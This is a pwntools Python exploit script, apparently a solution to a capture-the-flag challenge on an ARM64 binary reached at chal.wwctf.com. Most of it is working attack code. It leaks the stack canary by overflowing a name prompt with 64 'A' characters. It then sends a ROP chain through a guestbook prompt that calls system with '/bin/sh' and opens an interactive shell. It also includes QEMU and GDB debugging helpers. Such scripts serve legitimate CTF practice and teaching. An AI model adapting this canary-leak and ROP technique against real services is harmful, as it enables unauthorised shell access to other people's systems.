#!/usr/bin/env python3
from pwn import *
from subprocess import Popen

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
# libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "chal.wwctf.com", 32915



gdbscript = '''
init-gef
set architecture arm64
target remote :5000
b *0x4303a8
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64-static", "-g", "5000", exe] + argv)
        else:
            return process(["qemu-aarch64-static", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "qemu-aarch64-static chal"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if args.QEMU:
        gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
        for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
            gdb_args.extend(["-ex", cmd])
        Popen(gdb_args)
    elif args.DOCKER:
        gdbscript = f'''
        init-gef
        set sysroot /proc/{pid}/root
        c
        '''.format(**locals())        
        attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chal')
    else:
        attach(io, gdbscript=gdbscript)


# =========================================================
#                         EXPLOITS
# =========================================================

def exploit():
    global io
    io = initialize()
    debug()
    io.sendlineafter(b"Write your name: ", b"A"*64)
    io.recvline()
    canary = u64(io.recv(7).ljust(8, b"\x00")) << 8  # Read the padding to align the next read
    log.info("Canary: %#x", canary)

    pop_gadget = 0x4303a8 # ldr x23, [sp, #0x30] ; ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x40 ; ret ; nop ; adrp x0, #0x4a6000 ; ldr x0, [x0, #0xa70] ; ret
    mov_x0_x20 = 0x41dfbc # mov x0, x21 ; ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0xa0 ; ret
    system = 0x401b00
    log.info("Pop gadget address: %#x", pop_gadget)

    offset = 0x20
    payload = flat({offset:[canary, canary, pop_gadget, 0, 0, 0, mov_x0_x20, 0x1919191919191919, 0x0202020202020202, next(elf.search("/bin/sh")), 0x2222222222222222, 0x2323232323232323, 0x2222222222222222, 0x2929292929292929, system]}, filler=b"\x00")
    io.sendlineafter(b"Write your Guestbook: ", payload)
    io.interactive()

if __name__ == '__main__':
    exploit()
